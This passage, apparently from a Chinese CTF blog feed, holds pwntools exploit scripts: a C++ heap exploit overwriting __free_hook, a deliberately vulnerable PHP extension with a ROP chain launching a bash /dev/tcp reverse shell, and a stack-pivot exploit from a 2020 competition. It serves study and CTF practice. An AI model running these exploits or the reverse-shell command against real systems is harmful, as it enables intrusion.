punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> choice<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>         sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>        sa<span class="token punctuation">(</span><span class="token string">"data:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stackFunc</span><span class="token punctuation">(</span>choice<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> choice<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>         sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>        sa<span class="token punctuation">(</span><span class="token string">"data:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>vectorFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>vectorFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>listFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>listFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>queueFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>queueFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>stackFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>stackFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>listFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>listFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>queueFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>queueFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>stackFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>stackFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>vectorFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>vectorFunc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x00007ffff782eca0</span><span class="token operator">+</span><span class="token number">0x7ffff7443000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>listFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>listFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>stackFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#stackFunc(1,"/bin/sh\x00"+"\n")</span>vectorFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>vectorFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>vectorFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>vectorFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>listFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>vectorFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>stackFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>queueFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>queueFunc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>listFunc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>itv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> C++ PWN初探 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF </tag>
            
            <tag> double free </tag>
            
            <tag> vector释放漏洞 </tag>
            
            <tag> C++ PWN初探 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php-pwn环境搭建及一个小demo</title>
      <link href="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/"/>
      <url>/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/</url>
      
        <content type="html"><![CDATA[<h1 id="php拓展模块开发"><a href="#php拓展模块开发" class="headerlink" title="php拓展模块开发"></a>php拓展模块开发</h1><p>我们开发的是一个漏洞函数，为了后面进行调试</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本机的环境是Ubuntu18.04，我们使用下面的命令来简单的搭建开发环境</p><p>安装php，以及php开发包头 </p><p>$&gt; sudo apt install php php-dev<br>$&gt; php -v 查看php版本 </p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/0.png"></div><p>我的版本为7.2.24，之后我们去php的github的源代码发布页面上下载相同版本的源代码。</p><pre><code>php-7.2.24|____build --和编译有关的目录，里面包括wk，awk和sh脚本用于编译处理，其中m4文件是linux下编译程序自动生成的文件，可以使用buildconf命令操作具体的配置文件。|____ext --扩展库代码，例如Mysql，gd，zlib，xml，iconv 等我们熟悉的扩展库，ext_skel是linux下扩展生成脚本，windows下使用ext_skel_win32.php。 |____main --主目录，包含PHP的主要宏定义文件，php.h包含绝大部分PHP宏及PHP API定义。 |____netware --网络目录，只有sendmail_nw.h和start.c，分别定义SOCK通信所需要的头文件和具体实现。 |____pear --扩展包目录，PHP Extension and Application Repository。|____sapi --各种服务器的接口调用，如Apache，IIS等。|____scripts --linux下的脚本目录。 |____tests --测试脚本目录，主要是phpt脚本，由--TEST--，--POST--，--FILE--，--EXPECT--组成，需要初始化可添加--INI--部分。|____TSRM --线程安全资源管理器，Thread Safe Resource Manager保证在单线程和多线程模型下的线程安全和代码一致性。|____win32 --Windows下编译PHP 有关的脚本。|____Zend --包含Zend引擎的所有文件，包括PHP的生命周期，内存管理，变量定义和赋值以及函数宏定义等等。</code></pre><h2 id="模块生成"><a href="#模块生成" class="headerlink" title="模块生成"></a>模块生成</h2><p>扩展模块开发首先我们进入源代码目录，使用如下目录生成扩展模块的工程项目</p><p><strong>第一步：进入目录</strong><br>cd /source code/ext</p><p><strong>第二步：创建模块文件</strong><br>./ext_skel –extname=easy_phppwn</p><p><strong>第三步：写入拓展代码</strong></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/1.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/2.png"></div><p><strong>第四步：生成configure文件</strong></p><p>在当前目录执行：phpize</p><p><strong>第五步：配置编译</strong></p><p>./configure –with-php-config=/usr/bin/php-config</p><p><strong>第六步：修改Makefile</strong></p><p>取消-O2优化，否则会加上FORTIFY保护，导致memcpy函数加上长度检查变为__memcpy_chk函数，并且加上取消canary的保护</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/3.png"></div><p><strong>第七步：编译并增加php配置</strong></p><p>利用make指令进行编译，扩展目录下的modules目录，会生成一个.so，这个就是最终生成的扩展二进制文件。</p><p>此时需要编辑PHP配置文件php.ini，增加一行扩展配置：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> vim /etc/php/7.2/cli/php.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div style="width:70%;margin:auto">{% asset_img 4.png %}</div>可以直接写绝对路径<p>最后我们进行测试一下：</p><pre class="line-numbers language-bash"><code class="language-bash">php -m <span class="token operator">|</span> <span class="token function">grep</span> easy_phppwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果成功则会显示：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/5.png"></div><h2 id="调用写的函数"><a href="#调用写的函数" class="headerlink" title="调用写的函数"></a>调用写的函数</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// easy.php </span><span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"abcd"</span><span class="token punctuation">;</span> <span class="token function">easy_phppwn</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/6.png"></div><h1 id="php拓展模块的调试"><a href="#php拓展模块的调试" class="headerlink" title="php拓展模块的调试"></a>php拓展模块的调试</h1><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>反编译我们加载的so文件：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/7.png"></div><h2 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">def</span> <span class="token function">create_php</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"pwn.php"</span><span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pf<span class="token punctuation">:</span> pf<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''&lt;?php easy_phppwn(urldecode("%s")); ?>'''</span><span class="token operator">%</span>urlencode<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> buf <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x80</span> buf <span class="token operator">+=</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x10</span> create_php<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/8.png"></div>可以看到已经栈溢出了<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>执行gdb php</p><p>接下来执行run</p><p>ctrl+c后利用vmmap查看，我们可以看到已经加载了easy_phppwn.so</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/9.png"></div><p>我们现在可以设置断点了，如果在run之前设置会提示找不到该函数，设置断点我们需要设置真正的函数名，其实是zif_funcname，也就是我们在ida中看到的函数名，这里就是zif_easy_phppwn，同时设置参数为之前生成的pwn.php文件</p><p><strong>此时我们断在zif_easy_phppwn</strong></p><p>break zif_easy_phppwn</p><p><strong>设置执行文件</strong></p><p>set args ./pwn.php</p><p><strong>再次运行</strong></p><p>run</p><p>就成功断住了：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/10.png"></div><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>原作者说：phppwn题目来说，是基本没法使用one_gadget,system(‘/bin/sh’)来直接获取交互式shell的，所以这里通过使用popenv来开启一个反弹shell到vps上，当然其实还可以使用rop链构造调用mprotect函数来给stack执行权限，然后找一个jmp rsp来直接执行shellcode。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_php</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"pwn.php"</span><span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pf<span class="token punctuation">:</span>         pf<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''&lt;?php         easy_phppwn(urldecode("%s"));         ?>'''</span><span class="token operator">%</span>urlencode<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> <span class="token number">0x7ffff5e25000</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x2155f</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspop_rsi_ret <span class="token operator">=</span> <span class="token number">0x0000000000023e8a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspopen_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span>command <span class="token operator">=</span> <span class="token string">'/bin/bash -c "/bin/bash -i >&amp;/dev/tcp/127.0.0.1/6666 0>&amp;1"'</span>stack_base <span class="token operator">=</span> <span class="token number">0x7fffffffa548</span>stack_offset <span class="token operator">=</span> <span class="token number">0x1c330</span>stack_addr <span class="token operator">=</span> stack_offset<span class="token operator">+</span>stack_baselayout <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">,</span>    pop_rdi_ret<span class="token punctuation">,</span>    stack_base<span class="token operator">+</span><span class="token number">0x60</span><span class="token punctuation">,</span>    pop_rsi_ret<span class="token punctuation">,</span>    stack_base<span class="token number">-0x8</span><span class="token punctuation">,</span>    popen_addr<span class="token punctuation">,</span>    <span class="token string">'r'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">,</span>    <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">,</span>    command<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">]</span>buf <span class="token operator">=</span> flat<span class="token punctuation">(</span>layout<span class="token punctuation">)</span>create_php<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/php-pwn-huan-jing-da-jian-ji-yi-ge-xiao-demo/11.png"></div><p>直接执行php文件无法getshell不知道为什么。</p><p>参考链接：</p><p><a href="https://www.anquanke.com/post/id/204404" target="_blank" rel="noopener">WEBPWN入门级调试讲解</a><br><a href="http://www.maoyingdong.com/php7_extension_development_tutorial/" target="_blank" rel="noopener">Linux下PHP7扩展开发入门教程1：扩展开发流程</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web-Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web pwn </tag>
            
            <tag> php-pwn环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-国赛半决赛PWN题记录</title>
      <link href="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/"/>
      <url>/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="半决赛day1"><a href="#半决赛day1" class="headerlink" title="半决赛day1"></a>半决赛day1</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="简单的分析"><a href="#简单的分析" class="headerlink" title="简单的分析"></a>简单的分析</h3><p>栈溢出，栈迁移后利用函数打印libc地址，最后system(“/bin/sh”)，这个题当时做调试的时候出了些问题，这里有这么几个点：<br>1.没有用raw_input()暂停。<br>2.对32位连续调用函数的清空栈的做法不够熟悉了。<br>3.最后接受打印出的libc地址要使用recvn，不能用recv。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">"split"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./nooutput"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./nooutput"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048514</span>pop_ebp <span class="token operator">=</span> <span class="token number">0x0804857b</span>pop_ebx <span class="token operator">=</span> <span class="token number">0x08048359</span>pop_3_ret <span class="token operator">=</span> <span class="token number">0x08048579</span> <span class="token comment" spellcheck="true"># pop esi edi ebp</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Something:"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x804a160</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x80484F9</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token operator">+</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_ebx<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload2<span class="token operator">+=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_3_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804aa00</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>payload2<span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804aa00</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00"</span>payload2 <span class="token operator">=</span> payload2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token punctuation">)</span>payload2<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x804a080</span><span class="token operator">+</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'libc address == '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>payload3 <span class="token operator">=</span> p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token 